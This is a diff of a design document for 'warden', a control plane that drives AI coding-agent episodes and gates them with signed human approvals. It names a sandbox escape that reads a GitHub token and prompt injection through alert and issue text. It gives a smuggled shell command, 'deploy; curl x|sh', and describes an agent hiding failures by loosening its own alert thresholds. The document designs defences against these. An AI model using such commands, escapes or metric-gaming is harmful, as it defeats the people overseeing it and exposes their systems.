@@ -1,172 +1,264 @@
 # warden — design
 
 **warden turns a signal into a verified outcome, and it is the only thing in the
-estate that holds that state.** Everything else either feeds it (pollers),
-executes for it (sideclaw), or renders it (Argo, Slack).
+estate that holds that state.** Everything else feeds it (pollers), executes for
+it (sideclaw), or renders it (Argo, Slack).
 
-STATUS: design, not built. Extraction from `hermes-agent` is Wave 0.
+STATUS: design v2, not built. v1 was reviewed by three agents and one
+out-of-family model; four criticals came back and are folded in here.
+`REVIEW.md` records what was rejected and why.
 
 ---
 
 ## Why this exists
 
-The system warden replaces reasons correctly and then drops the answer. Measured
-over 14 days to 2026-09-09, on the live `watchdog.db`:
+Measured on the live `watchdog.db`, 14 days to 2026-09-09:
 
 | | |
 |-|-|
 | Distinct signatures entered the loop | 49 |
-| `investigate` episodes run | 15 |
-| → produced a shipped fix | **1** |
+| `investigate` episodes in the window | 11 (15 all-time, over 38 days) |
+| → produced a shipped, merged fix | **1** |
 | Items marked `resolved` | 28 |
-| → liveness-verified fix | **0** |
-| → closed because the signal went quiet for 2h | 26 |
+| → closed because the signal went quiet | 23 |
+| → closed on an observed recovery message | 2 |
 | Items holding a written fix and no way to say yes | 3 |
 
-Nine of the last ten investigate verdicts were read and dropped. The diagnoses
-were not wrong — each of the three stuck items carries concrete, correct
-instructions in its `note` field, and one of them has been sitting there since
-2026-09-07. The defect is that a correct verdict has nowhere to go.
+The one success is worth stating precisely, because it is the existence proof
+that the chain works: dispatch id15 diagnosed a HyperDX threshold bug, id16
+implemented it, PR `jkrumm/vps#8` merged 2026-09-08, and the two alerts it
+touched then resolved through `resolve_recovery_paired()` — a positive-signal
+path, not a timeout. One in eleven. The other ten verdicts were correct and went
+nowhere.
 
-There is a second, structural failure. Ingest (`watchdog-poll.py`) and
-verdict-folding (`dispatch-sweep.py`) run as cron jobs **inside the Hermes
-gateway process**; the act-loop runs on its own LaunchAgent. When the gateway
-crash-looped on 2026-09-07 — seven restarts in three and a half minutes — the
-loop kept ticking against a ledger that had stopped receiving signals and a
-dispatch table whose verdicts were never folded back. It had no way to notice it
-was blind. The item still open about that crash is `uk:229`.
+Three items are still sitting in `needs_human`, each with concrete repro and fix
+steps written into its `note`, the oldest since 2026-09-07. **A correct verdict
+has nowhere to go.** That is the defect.
 
-A control plane cannot live inside the thing it supervises. That is the whole
-argument for a separate repo, and it is the same argument that already moved the
-act-loop out of the gateway's scheduler once.
+A second, structural failure: ingest (`watchdog-poll.py`) and verdict-folding
+(`dispatch-sweep.py`) run as cron jobs **inside the Hermes gateway process**,
+while the act-loop runs on its own LaunchAgent. The gateway crash-looped on
+2026-09-07 — seven restarts in 3m34s, confirmed in `gateway-starts.log` — and
+the loop kept ticking against a ledger that had stopped receiving signals. It
+had no way to notice it was blind.
+
+A control plane cannot live inside the thing it supervises. That is the argument
+for a separate repo, and it is the same argument that already moved the act-loop
+out of the gateway's scheduler once.
 
 ---
 
 ## What "done" means
 
-Five numbers, which warden reports about itself. Not a feeling.
-
 | Metric | Today | Target |
 |-|-|-|
-| Verdicts reaching a **recorded** decision | 1 / 15 | 15 / 15 — `implement`, `dismissed` with a reason, or `needs_human`. Silence is never an outcome. |
-| Closes that are verified fixes vs. silence | 0 / 28 | verified is the majority of closes **for mapped signatures** |
-| Median time from `needs_human` to a human decision | no answer path exists | < 4h |
+| Verdicts reaching a **recorded** disposition | 1 / 11 | 11 / 11 — `implement`, `dismissed` with a reason, or `needs_human`. Silence is never an outcome. |
+| Closes that are verified fixes vs. silence | 2 / 28 | verified is the majority of closes **for mapped signatures** |
+| Median `needs_human` → human decision | no answer path exists | < 4h |
 | Verified unattended fixes per week | 0 | ≥ 2, sustained over a month |
 | Minutes with no poller running | unmeasured | 0, and alarmed |
+| **Reverts and reopen-after-`fixed`** | unmeasured | tracked per category; either one demotes a tier |
 
-The first row is the one that matters. A fix rate is not the target — some
-verdicts genuinely conclude "nothing to do here." **Dropping a verdict on the
-floor is the defect**, and it is measurable.
+The last row is not decoration. Without it the fourth row is trivially gameable —
+see *Self-concealing change* below.
 
 ---
 
 ## Non-goals
 
 - **Not an LLM coordinator.** No supervisor agent, no agent-to-agent messaging.
-  The published failure taxonomy for that shape (MAST, 200+ traces across seven
-  multi-agent systems) is 41.8% specification failures, 36.9% inter-agent
-  misalignment, 21.3% verification failures. Anthropic's own multi-agent writeup
-  says it plainly: poor fit when steps share context or have dependencies, and
-  coding parallelizes worse than research. This pipeline is sequential and
-  dependent. Code coordinates it.
-- **Not a workflow engine.** SQLite plus a 10-minute tick. The one thing that
-  would justify Temporal or Restate is a durable wait for a human, and a signed
-  `approvals` row already is one.
-- **Not a chat interface.** Slack and Argo are surfaces over this, never state.
-- **Not a product.** Single operator, single tenant, no auth model beyond a
-  bearer token and a signed decision.
+  MAST's taxonomy over 200+ traces: 41.8% specification failures, 36.9%
+  inter-agent misalignment, 21.3% verification failures. Anthropic's own writeup
+  says multi-agent is a poor fit when steps share context or have dependencies,
+  and that coding parallelizes worse than research. This pipeline is sequential
+  and dependent.
+- **Not a workflow engine.** SQLite plus a 10-minute tick.
+- **Not a chat interface.** Slack and Argo are surfaces, never state.
+- **Not a general planner.** See *Known limit: the planning problem*.
 
 ---
 
 ## Principles
 
-1. **One ledger.** `warden.db` is the source of truth. Slack cards and Argo
-   pages are projections, re-rendered from rows. A button click is not the
-   event — it writes to the ledger and the ledger re-renders the surface.
+1. **One ledger.** `warden.db` is the source of truth. Slack cards and Argo pages
+   are projections. A button click is not the event — it writes to the ledger and
+   the ledger re-renders the surface.
 2. **Deterministic control plane; LLMs only inside bounded steps.** No LLM call
-   decides a state transition. Episodes return typed output; warden validates it
-   against a schema and a policy before acting on it.
-3. **Every surface is optional; the ledger and the loop are not.** If Argo is
-   down, Slack works. If Slack is down, the loop runs. If the Hermes gateway is
-   down, ingest keeps running — that is the bug this design fixes.
-4. **Policy names a key, code decides the argv.** `triage-policy.json` and
-   `deploy-targets.json` are machine-writable (warden's own mapping proposer
-   commits to the first one). A policy edit must never be able to express a
-   command.
-5. **Honest states.** A signal going quiet is not a fix. `quiet` and `fixed` are
-   different terminal states and the difference is visible everywhere.
-6. **No step trusts a previous step's memory.** Every stage re-derives its own
-   eligibility from the ledger on every pass. Restarting warden mid-chain loses
-   nothing.
-7. **Ask a human only where a human is essential.** Defined below — this one has
-   a test, because "ask when unsure" is how a system becomes friction.
+   decides a state transition.
+3. **Every surface is optional; the ledger and the loop are not.**
+4. **Policy names a key, code owns the entire argv.** No exceptions — see
+   *Deploy*, where v1 broke this and had to be reverted.
+5. **Observation status and remediation obligation are different facts.** A
+   signal going quiet may cancel the need to *start* work. It may never discharge
+   a verdict, a pending approval, or an in-flight operation.
+6. **Every non-terminal state names the thing that polls it and its deadline.**
+   Checked against the diagram, not assumed.
+7. **Nothing is silently discarded to stay under a bound.** Overflow waits.
+8. **Ask a human only where a human is essential** — four cases, below.
 
-### When a human is essential
+---
 
-Exactly three cases. Everything else runs unattended.
+## Security model: the episode is not contained
 
-- **Irreversible and unscoped.** The action falls outside a declared
-  `autoMergePaths` / `deploy-targets` scope, or has no tested compensation.
-- **Only a human can supply it.** Biometric `op`, a tailnet ACL push, a
-  console-only action, a decision about intent rather than fact.
-- **The evidence is genuinely ambiguous and the wrong branch is expensive.**
-  Two plausible root causes with materially different fixes.
+This is stated first because v1 assumed the opposite and every gate downstream
+depends on it.
 
-**Approval fatigue is a failure mode, not a safety feature.** An approval the
-operator grants every time is a bug: either widen the scope so it runs
-unattended, or delete the gate. Warden reports its own approve/deny ratio per
-category for exactly this reason — a category running at 100% approve gets
-promoted to automatic.
+sideclaw's `readOnly` tier is three tool names on a CLI flag —
+`--disallowedTools Write,Edit,NotebookEdit` — under
+`--dangerously-skip-permissions`. **Bash is unrestricted.** sideclaw's own source
+comments name two confirmed escapes, one of which is
+`secrets-run read op://mini/github/token`, promptless on this host, with the
+recipe in the CLAUDE.md that tier deliberately loads. Its conclusion: *"the
+honest fix is an OS-level sandbox."*
+
+Three consequences, all binding:
+
+- **A bearer token on the mini is not an authorization boundary against an
+  episode.** Anything an episode can `curl`, it can reach.
+- **The brief is attacker-influenceable.** Public GitHub issues, alert text and
+  log lines all reach it.
+- **`POST /api/jobs` on sideclaw has no auth and no repo allowlist.** `cwd` is
+  any absolute path containing `.git`. The entire repo-scope control today is
+  `resolve_repo()` inside `hermes-cc.sh` — which this design moves to warden.
+
+**Therefore the repo allowlist and tier ceiling must be re-asserted inside
+sideclaw, in Wave 0.** Warden's copy is defence in depth; sideclaw's is the
+boundary. Moving the only check out of the executor and calling that a
+separation of concerns is how the tiers table becomes advisory.
+
+**And warden may never hold tier ≥ 1 on `sideclaw` or on `warden` itself.**
+sideclaw is a valid dispatch target today; auto-merging PRs against your own
+executor closes a loop that has no outside.
 
 ---
 
 ## The model
 
-Four nouns. Everything in the schema is one of them.
-
 | Noun | What | Owner |
 |-|-|-|
-| **Signal** | One deduplicated observation from a source. Append-only. | pollers |
-| **Item** | One unit of work, 1:1 with a signal, carrying a lifecycle. | the loop |
-| **Episode** | One bounded sideclaw run against one repo. Disposable. | sideclaw |
-| **Decision** | One signed human answer. Durable, single-use. | the decision API |
+| **Signal** | One deduplicated observation. Append-only. | pollers |
+| **Item** | One unit of work with a lifecycle and an obligation. | the loop |
+| **Episode** | One bounded sideclaw run. Disposable — the verdict is copied into the ledger the moment a terminal status is read. | sideclaw |
+| **Intent** | An unsigned request for a human decision. | any surface |
+| **Decision** | One signed human answer, bound to bytes. Single-use. | the signer |
 
-An item's **origin** is what generalizes this beyond alerts:
-
-| Origin | Source | Notes |
-|-|-|-|
-| `alert` | Slack, UptimeKuma, docker, hermes logs, op refs | today's only origin |
-| `github_issue` | `gh` poll | the operator's own handover mechanism — currently ingested and then ignored |
-| `github_pr` | `gh` poll | review needed |
-| `human` | Slack or Argo | file work directly |
-| `agent` | an episode | follow-up work an episode discovered |
-
-Same ledger, same lifecycle, same surfaces for all five.
+Origins (Wave 3+, deliberately not in the first release): `alert` today;
+`github_issue`, `github_pr`, `human`, `agent` later.
 
 ### Lifecycle
 
+Redrawn from the implemented machine, not from scratch. `pr_open`, `snoozed` and
+the dissolve edge are real and were missing from v1.
+
 ```
-new -> investigating -> verdict -+-> implementing -> validating -+-> merged
-                                 |                               |
-                                 +-> needs_human                 +-> merge_blocked
-                                 +-> dismissed
-                                                merged -> deploying -> verifying -+-> fixed
-                                                                                  +-> new (reopened)
+new -> investigating -> verdict -+-> implementing -> validating -+-> merged -> deploying -> verifying -> fixed
+                                 |                               +-> merge_blocked
+                                 +-> needs_human                 
+                                 +-> dismissed (reason required)
+                                 +-> pr_open
+                                 +-> new           (UNRELATED SIGNATURES, cluster dissolve)
+new -> ignored | note | snoozed -> new
 terminal: fixed | quiet | closed | dismissed | ignored | note
 ```
 
-Two changes from the current machine, both about honesty:
+Two changes from today, both about honesty:
 
-- **`resolved` splits.** `fixed` means a deploy landed and a positive signal
-  confirmed it. `quiet` means the signal stopped and nothing shipped. `closed`
-  means a human said done. Today all three render as `resolved`, which is why
-  the board reads 28 successes and means 26 silences.
-- **`dismissed` is new.** A verdict that concludes "nothing to do" must record
-  that, with the reason, as a terminal state. Right now it has nowhere to go,
-  which is precisely how nine of ten verdicts vanished.
+- **`resolved` splits.** `fixed` = a change landed and a positive signal
+  confirmed it. `quiet` = the signal stopped and nothing shipped. `closed` = a
+  human said done.
+- **`dismissed` is a real terminal state** with a required reason. Cheap to
+  build: sideclaw's verdict enum already has `nextAction: "none"` and nothing
+  consumes it.
 
-Every non-terminal state also goes to `quiet` when its underlying signal
-resolves — that already falls out of the machine and should stay that way.
+### The quiet rule, corrected
+
+v1 said "every non-terminal state also goes to `quiet` when its underlying signal
+resolves." **That reproduces the exact bug warden exists to fix.** Execute it: an
+intermittent fault alerts, an investigation writes a correct fix, the item
+reaches `needs_human`, the fault clears on its own, the item goes terminal
+`quiet`, the written fix is abandoned. Renaming the state changed nothing.
+
+Worse in the chain: it lets `implementing`, `deploying` and `verifying` go
+terminal while an external operation is still running — the ledger declaring
+work finished while the actuator is still changing production.
+
+And it is already live: `_GROUPED_RESOLVE_EXCLUDED_STATES` excludes only
+`resolved/ignored/snoozed/note/investigating`, so a grouped-source item in
+`needs_human` **quiet-resolves after 2h** — 90 minutes before this document's own
+4h SLA for answering one. The metric would read better the more human decisions
+got dropped.
+
+**Rule:** silence-resolve applies only to `new`. Every other state carries an
+obligation and exits only through its own transition or its deadline.
+
+### Deadlines
+
+Every non-terminal state gets a `state_deadline` and a named poller. Today only
+`liveness_pending` has one; `poll_implement_jobs` and `poll_validation_jobs` have
+no deadline and no attempt counter, and sideclaw prunes terminal jobs at 24h *or*
+200 rows — a cap shared with every interactive `/check`. An item whose job was
+pruned is stuck forever with nothing polling it out.
+
+| State | Poller | Deadline | On expiry |
+|-|-|-|-|
+| `investigating` | dispatch poll | 2h | `needs_human`, note the timeout |
+| `implementing` | implement poll | 2h | `merge_blocked` |
+| `validating` | validation poll | 1h | `merge_blocked` |
+| `merge_blocked` | operator | 7d | `dismissed`, reason `unresolved` |
+| `merged` (no deploy) | — | 1h | `closed` |
+| `deploying` | reconciler | 30m | `unknown` → reconcile |
+| `verifying` | liveness | 2h | `new`, reopened with history |
+| `needs_human` | operator | 7d, reminder at 1d | `dismissed`, reason `expired` |
+| `pr_open` | PR poll | 14d | `dismissed` |
+
+---
+
+## When a human is essential
+
+Four cases. Everything else runs unattended.
+
+1. **Irreversible and unscoped** — outside a declared path scope, or with no
+   tested compensation.
+2. **Only a human can supply it** — biometric `op`, a tailnet ACL push, a
+   console-only action, a judgement about intent rather than fact.
+3. **Genuinely ambiguous with expensive branches** — two plausible root causes
+   with materially different fixes.
+4. **The change alters the system's ability to observe itself** — monitoring
+   config, alert thresholds, log levels, the health check, warden's own policy
+   files. **This case is never promotable to automatic.**
+
+### Self-concealing change — why case 4 exists
+
+The seeded auto-merge scope is `vps/observability/**` and the seeded liveness
+probe re-reads the merged threshold from HyperDX. That verifies *the deploy
+applied*. It does not verify the alert can still fire.
+
+An alert fires. Warden diagnoses "threshold too tight," raises it, validates,
+merges, deploys. The probe confirms the new threshold is live. Item → `fixed`.
+**The alert now never fires, and `/metrics` scores this as a verified unattended
+fix — the number this design optimizes for.** The operator finds out when the
+thing being watched for happens, unwatched.
+
+Mitigations, all required together:
+
+- Case 4 above: monitoring config never goes above tier 2.
+- `fixed` for monitoring config requires a **synthetic trip** proving the alert
+  still fires, not that the config landed.
+- A deploy target's own definition — `Makefile`, `scripts/**`, `.github/**` — is
+  permanently outside every `autoMergePaths`. Otherwise warden can write the code
+  it then executes.
+
+### Promotion and demotion
+
+v1 said "an approval you grant every time is a bug, promote it." That is wrong on
+its own: approve-rate measures the sample, not the policy, and approval fatigue
+causes a 100% approve rate as often as good scoping does.
+
+- **Promotion requires two independent signals**: a high approve-rate **and** a
+  clean outcome record — verified `fixed`, zero reverts, zero reopen-after-`fixed`
+  — over the same window. It is a manual policy edit, never automatic.
+- **Demotion is automatic**: one revert or one reopen-after-`fixed` drops the
+  category a tier.
 
 ---
 
@@ -175,169 +267,275 @@ resolves — that already falls out of the machine and should stay that way.
 | System | Responsibility | Holds state? | Failure domain |
 |-|-|-|-|
 | **warden** | ingest, dedupe, decide, drive the lifecycle, ask a human | **yes — the ledger** | mini, own LaunchAgents |
-| **sideclaw** | execute one bounded Claude Code episode | job store only, disposable | mini, own daemon |
-| **hermes** | conversational agent; Slack surface; also a signal source | its own, unrelated | mini, gateway process |
-| **Argo** | operator console: board, timeline, approvals, system state, cost | display cache only | **VPS — separate domain** |
+| **sideclaw** | execute one bounded episode; **enforce the repo allowlist and tier ceiling** | job store, disposable | mini, own daemon |
+| **signer** | mint a signed decision; reachable only by Slack Socket Mode and a TTY-gated CLI | signing key, RAM-only | gateway process |
+| **hermes** | conversational agent; Slack surface; also a signal source | its own, unrelated | mini, gateway |
+| **Argo** | operator console; records intents | display cache only | **VPS — separate domain** |
 
-The two rules that fall out and must not be broken:
+warden never runs inside sideclaw (the loop judges whether the actuator worked)
+and never inside hermes (already learned once).
 
-- **warden never runs inside sideclaw.** The loop decides whether the actuator
-  worked; put them in one process and the thing that would notice sideclaw
-  wedged is inside sideclaw.
-- **warden never runs inside hermes.** Same argument, already learned once the
-  hard way, and still half-violated today by the two gateway cron jobs.
+**One contract to sideclaw, not four.** `hermes-cc.sh` is four things and only two
+belong here: the budgets, `resolve_repo`, `resolve_tier`, `require_auto_from_item`,
+`merge_gate_check` and `run_deploy_if_enabled` are warden; the sideclaw client is
+a thin replaceable shim; ~700 lines of GitHub API is its own module; the token
+handling is shared infra. Warden depends on exactly
+`submit(tier, repo, brief, model) -> jobId` and `get(jobId) -> {status, result}`.
+`record_as_job_json` and hermes-cc's invented `queued`/`lost` statuses are deleted,
+not moved.
 
-Argo living on the VPS is a feature, not an accident: the console that tells you
-the mini is broken should not need the mini. Slack buttons need the gateway's
-Socket Mode and will degrade when it doesn't; that is the honest ranking. Slack
-is the convenience path, Argo is the one that works when it matters.
+**The verdict schema is published by sideclaw as a versioned artifact.** It
+physically lives there (`dispatch.ts`, zod `strictObject` per tier); copying it
+into warden guarantees drift, and drift presents as "verdict silently ignored" —
+the exact failure this exists to fix. A version mismatch is a loud refusal, not a
+best-effort parse.
+
+**Verdicts must become typed before warden can classify them.** Seven distinct
+handler outcomes are currently string-concatenated into one prose `verdict` field,
+and a sensitive-withheld verdict is typeless entirely — detectable only by
+substring-matching `"Verdict withheld: matched "`, and indistinguishable from a
+genuine needs-human. A typed `outcome` enum in sideclaw is a small PR and it
+unblocks the headline metric.
 
 ---
 
 ## Contracts
 
-### HTTP API (mini, bearer-authenticated, tailnet-only)
+### The decision primitive — intent and signature are separate
 
-Argo is the primary client. Everything is derived from the ledger; nothing here
-holds state of its own.
+v1 proposed `POST /items/:id/decide` behind a bearer token. **That destroys the
+only property that makes the gate real.** Today the signing key exists solely in
+the gateway's RAM, is minted at startup, is never serialized, and the only thing
+that can cause a signature to exist is a Slack interaction payload. The plugin
+states it in one sentence: prompt injection reaching a brief *"produces words, and
+words cannot mint a signature."* **A bearer token is words** — and per the
+security model, an episode can hold one.
+
+Second defect: `payload_hash` binds an approval to specific *bytes*.
+`decide(item_id, …)` binds to mutable state, so the brief can change between
+decision and spend. A strict downgrade.
+
+Split it:
+
+```
+POST /items/:id/intent   -> records an unsigned request. Any surface. Not authority.
+sign(intent) -> Decision -> only Slack Socket Mode or a TTY-gated CLI.
+                            Binds payload_hash over the exact brief bytes.
+```
+
+Argo shows the queue and records intents. It cannot approve. Confirmation happens
+in Slack or at a TTY — the `human-queue` shape, which already requires a typed
+`yes` on a real terminal. Keep `require_signed_approval()` exactly as it is: it
+trusts only the row's signature and never the caller, which is why it survives
+this change untouched.
+
+`--auto-from-item` stays as-is, including its own honest header: it is *"a
+precondition the caller cannot fabricate cheaply,"* not a cryptographic proof —
+*"the threat it closes is the loop being WRONG, not the loop being HOSTILE."*
+That distinction is exactly what a bearer-authenticated `/decide` erased.
+
+### HTTP API (mini, tailnet-only, **read-only**)
 
 | Method | Path | Purpose |
 |-|-|-|
-| `GET` | `/board` | every item, current state, one row each — the kanban |
-| `GET` | `/items/:id` | full timeline: signal, brief, verdict, PR, validation, deploy, verification, with artifact URLs |
-| `GET` | `/health` | heartbeat: last completed pass, state census, poller ages |
-| `GET` | `/metrics` | the five "done" numbers above, computed |
-| `POST` | `/items/:id/decide` | `{action, actor, note}` → the decision primitive |
-| `POST` | `/items` | file work by hand (`human` origin) |
+| `GET` | `/board` `/items/:id` `/health` `/metrics` | projections; opened `file:…?mode=ro` |
+| `POST` | `/items/:id/intent` | records an intent; never signs, never executes |
 
-Argo caches `GET` responses in its own Postgres purely so the page renders when
-the mini is unreachable, stamped with the fetch time. That is an HTTP cache, not
-a mirror: Argo never writes item state, and there is no sync protocol to get
-wrong.
+Argo caches `GET` responses in Postgres purely so the page renders when the mini
+is unreachable, stamped with fetch time. An HTTP cache, not a mirror.
 
-`POST /items/:id/decide` is never cached, never queued, and fails loudly when
-the mini is unreachable. An approval is a transaction.
+### Deploy — the closed allowlist stays
 
-### The decision primitive
+v1 proposed a machine-writable `deploy-targets.json` interpolated into
+`ssh <host> "cd <dir> && make <target> <env>"` and claimed `rm -rf` was
+inexpressible. **That string is a shell.** `"deploy; curl x|sh"` is a second
+command; `env` was unquoted. It broke principle 4 on the same page that states it.
 
-Today the cryptographic gate is already surface-agnostic —
-`require_signed_approval()` trusts only the row's Ed25519 signature and never the
-caller. What is missing is a public entrypoint: the only wired orchestration is a
-Slack Bolt handler with the approver allowlist inlined in it.
+Keep the closed `case`: the JSON names a **key**, code owns the whole argv. This
+is the shape already used three times (`VERB_ALLOWLIST`, `EVIDENCE_ALLOWLIST`,
+`LIVENESS_ALLOWLIST`) plus `deploy_argv` — four instances of one principle. Adding
+a repo is a two-line diff, which is acceptable friction for the property.
 
-Extract exactly one function, and make every surface a client of it:
+Even with perfect quoting, a Make target executes repo code, so *who may modify
+the target* matters more than *who may name it* — hence the `Makefile`/`scripts/**`
+exclusion above.
 
-```
-decide(item_id, action, actor, note) -> Decision
-  action ∈ { approve, deny, snooze, dismiss, escalate }
-```
+Prefer not needing this at all: `meteo`, `research-gateway` and `argo` deploy via
+GitHub Actions → RollHook, so merge *is* deploy. **`image-share` does not** — it
+has no CI and self-documents "CI-less for now," so it belongs with
+`vps/observability/`, `homelab` and `homelab-private` in the group that needs a
+deploy key.
 
-It records the decision, signs it, and lets the existing verify-and-spend path
-run unchanged. Slack buttons call it. Argo calls it. A CLI calls it. Build it
-once here, or build it twice later.
+### Budgets — absent from v1 entirely
 
-### `deploy-targets.json`
+Autonomy without a rate limit is the blast-radius answer. Existing ceilings must
+survive the move and be stated: `MAX_OPEN_INVESTIGATIONS=3`,
+`DAILY_INVESTIGATE_BUDGET=8` (deliberately under hermes-cc's own 20, so a triage
+storm cannot starve interactive dispatch), `MAX_CLUSTER_SIGNATURES=5`,
+`MAX_IMPLEMENT_PER_DAY=5`, `MAX_MERGES_PER_DAY=3`. At tier 3 with no daily merge
+cap, forty correlated alerts are forty merges and forty deploys.
 
-The current `deploy_argv()` is a bash `case` with one arm, so adding a repo means
-editing shell. That friction is real and the fix does not weaken anything:
+Add: **a per-repo in-flight lock.** Two implement episodes on one repo today cut
+two branches from the same base and open two unaware draft PRs — reachable now,
+more so as origins multiply.
 
-```json
-{ "vps":     { "host": "vps",     "dir": "~/vps",     "target": "hyperdx-apply", "env": "ENV=prod" },
-  "homelab": { "host": "homelab", "dir": "~/homelab", "target": "deploy" } }
-```
+### Abort and revert — neither exists today
 
-argv is always `ssh <host> "cd <dir> && make <target> <env>"`. The only free
-variable is a **Makefile target name**, itself declared in the target repo. N
-repos, zero code edits, and `rm -rf` stays inexpressible.
+`cancel` does not cancel: sideclaw exposes submit/list/get only, so it marks the
+local row `abandoned` while the episode keeps running. The honest answer to "how
+do I stop it" is currently `make herdr-restart`.
 
-The mini already has keyless Tailscale SSH to `homelab` and `vps`, so reach is
-not the missing piece — the allowlist is.
+- `POST /api/jobs/:id/cancel` in sideclaw, and `warden abort <item>` as a
+  lifecycle transition.
+- `warden revert <item>` as a first-class transition that records the revert PR
+  on the item.
+- An item whose episode was interrupted mid-push needs a ledger field for *"there
+  is an orphan branch or PR from this item"* — sideclaw deliberately never
+  recovers `dispatch` on restart, and salvage bundles are referenced only inside
+  an error string.
 
-### Autonomy tiers
+### Crash recovery — the ledger cannot be atomic with the world
 
-Per repo, in `triage-policy.json`. Deliberately conservative and deliberately
-promotable.
+SQLite can atomically change a row. It cannot atomically change a row *and* merge
+a PR, start a job, or deploy a service. Crash after a successful deploy and before
+recording it: warden either repeats a destructive operation, or refuses because
+the approval is spent — which is "approved fix, no action completed" again.
 
-| Tier | Warden may | Gate |
-|-|-|-|
-| 0 | investigate, report | none |
-| 1 | + open a draft PR | path scope |
-| 2 | + merge | path scope, validation by a different model, CI green or `noCiRequired` |
-| 3 | + deploy | tier 2 plus a declared `deploy-targets` entry |
-| 4 | + close on verified signal | tier 3 plus a declared `liveness` predicate |
+v1's claim that "restarting warden mid-chain loses nothing" was unsupported.
+Required:
 
-A repo with no entry is tier 0. There is no implicit allow. Promotion is a
-policy edit, made after watching the tier below run clean — and warden's own
-approve/deny ratio is the evidence for when to promote.
+- An **operation id** recorded before dispatch; the approval binds to it.
+- **Remote receipts** where available (PR merge sha, deploy run id).
+- **`unknown` is an explicit outcome**, reconciled before any retry — never
+  silently read as failure.
 
-### Repos that should not need a deploy tier at all
+---
 
-`meteo`, `research-gateway`, `image-share` and `argo` already deploy through
-GitHub Actions → RollHook. For those, **merge is deploy** and warden needs no
-shell reach whatsoever. Prefer that. The deploy tier exists for what genuinely
-cannot have CI — `vps/observability/`, `homelab`, `homelab-private` — not as the
-default answer.
+## The ledger
+
+Today `db_connect()` is a bare `sqlite3.connect()` — no WAL, no `busy_timeout` —
+with six writers already (the loop, two pollers, `hermes-cc.sh`'s embedded python
+several times per invocation, the Slack approval handler, CLI verbs), and **two
+processes independently `ALTER TABLE` the same tables with no version table**.
+Adding an HTTP server that a VPS dashboard polls means `SQLITE_BUSY` on the loop's
+write path, caused by a dashboard read.
+
+- `journal_mode=WAL`, `busy_timeout=5000`.
+- **One writer process.** The API opens read-only; intents go through the loop's
+  queue.
+- **One migrator** plus a `schema_version` table; migrations run only by the loop
+  at boot; the API refuses to start on mismatch.
+- **Backup.** `VACUUM INTO` on every heartbeat, rotated, one copy off the mini.
+  There is no restore path today, on a machine with FileVault off, auto-login on
+  and unattended reboots.
+- After extraction, the Slack approval plugin must stop writing this file
+  directly, or the "control plane inside the thing it supervises" coupling
+  silently returns.
 
 ---
 
 ## Observability
 
-Warden's own health is a first-class output, because the failure this design
-exists to fix was invisible for eleven days.
+- **Heartbeat** — one unconditional row per completed pass with the state census.
+  Shipped. This is the fix for the failure that hid for eleven days.
+- **Per-poller age** — the gateway-crash mode becomes an alarm instead of silence.
+- **Funnel metrics** — the six numbers above, at `/metrics`, rendered in Argo.
+- **Cost per item.** Baseline: total real-money LLM spend across the estate is
+  $82 / 14 days; the agentic path runs on the flat Max subscription. **Cost is not
+  a constraint on this design** — route for quality.
+- **Uptime Kuma push**, joining the existing composite heartbeat.
 
-- **Heartbeat.** One row per completed pass, written unconditionally, carrying
-  the state census and open-cluster count. A stalled loop is a stale timestamp;
-  an idle loop is a fresh timestamp with an unchanged census. (Shipped already,
-  in the pre-extraction code.)
-- **Poller age.** Per source, the age of the last successful poll. The
-  gateway-crash failure mode becomes an alarm instead of a silence.
-- **Funnel metrics.** The five numbers from "What done means", computed on
-  demand at `/metrics` and rendered in Argo. Weekly delta in the digest.
-- **Cost per item.** Episodes carry token cost; attribute it to the item so
-  "what did this fix cost" is answerable. Note the current baseline: the entire
-  real-money LLM spend across the estate is ~$82 / 14 days, and the agentic path
-  runs on the flat Max subscription. **Cost is not a constraint on this design**
-  — route the agentic path for quality.
-- **Uptime Kuma push.** Warden joins the existing composite heartbeat rather
-  than inventing a monitoring stack.
+---
+
+## What must not be lost
+
+Details in the current implementation that read like accidents and are not.
+
+1. **`card_hash` short-circuit** — stops the channel becoming a firehose, *and*
+   is currently the only thing hiding the grouped-reopen churn bug. **Fix the
+   reopen condition first** — reopen on a new occurrence, not on
+   `resolved_at IS NULL` — before relying on re-render.
+2. **Dissolve deliberately leaves `dispatch_job` set** as a cooldown anchor.
+   Clearing it lets `escalate()` re-fuse the pair in the same run.
+3. **Two match targets per event** — `source:external_id` *and*
+   `source:normalize_title(title)`. Without the second, every `uk:*` rule is
+   unmappable: UptimeKuma's `external_id` is an opaque id that changes on recreate.
+4. **Grouped vs. state sources are two mechanisms.** Grouped never
+   disappearance-resolve; the idle anchor is
+   `last_reminder_at || notified_at || first_seen`, needing no new column.
+   Recovery-pairing is the strong path, the 2h timer the fallback, and neither
+   ever claims a fix.
+5. **`note` vs `ignored`.** `ignored` is invisible; `note` is uncarded but in the
+   daily digest. The split exists because the DB contains a human message naming
+   a root cause and its two-line fix, never shipped.
+6. **The four closed allowlists.** One principle, four instances. v1 broke the
+   fourth; don't break the others while generalizing.
+7. **Overflow waits, never drops** — cluster members past 5 stay `new`.
+8. **The dry-run contract** — never touches Slack, never shells out, everything
+   else real. With no staging environment this is the only pre-production surface
+   that exists.
+9. **`_strip_op_refs_timestamps()`** applies to one fallback path only.
+   `normalize_title()` is unchanged because six sources depend on its behaviour.
+
+---
+
+## Known limit: the planning problem
+
+Warden executes independently-decidable, single-repo steps. A verdict can be
+correct and not fit that: *"fix the server first, deploy it, then the client; if
+the server probe fails, stop."* There is no representation for an ordered
+cross-repo plan, for shared evidence between two items, or for revising a plan
+when the first deploy disproves the diagnosis. The cluster-feedback open question
+is evidence of this boundary, not a parser gap.
+
+For the first release this is **declared unsupported**: such a verdict routes to
+`needs_human` under case 3. That is honest, and it means the human-essential list
+has a de-facto fifth entry — *the plan does not fit the executor* — which should
+be named rather than discovered.
 
 ---
 
 ## Migration
 
-| Wave | What | Why this order |
-|-|-|-|
-| **0** | Extract to `warden`. `git mv` with history: the three scripts, `hermes-cc.sh`, both config files, tests, docs, the DB, the LaunchAgent. Promote the two gateway cron jobs to LaunchAgents. | The seams are already cut. Doing this first means every later wave lands in a clean repo instead of being grafted onto a fork overlay and moved afterwards. |
-| **1** | Decision API + `decide()`; Slack buttons repointed at it. | The bottleneck. Everything downstream is worth less until a verdict can be answered. |
-| **2** | Honest states (`fixed` / `quiet` / `closed` / `dismissed`); `/metrics`. | Makes wave 1's effect measurable. Cheap, and it must land before more volume arrives. |
-| **3** | New origins: `github_issue`, `github_pr`, `human`. | The operator's handover mechanism starts working. Gated per origin. |
